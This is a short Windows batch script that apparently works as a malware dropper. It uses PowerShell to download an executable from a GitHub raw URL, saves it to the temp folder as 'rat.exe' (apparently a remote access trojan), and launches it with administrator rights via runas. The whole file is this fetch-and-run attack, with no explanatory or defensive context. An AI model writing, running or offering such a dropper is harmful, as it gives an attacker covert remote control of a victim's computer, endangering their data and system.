@echo off

powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/claykrs/claykers/main/fbf12e4f.exe -OutFile %TEMP%\rat.exe"
start /B "" runas /user:Administrator "%TEMP%\rat.exe"

endlocal
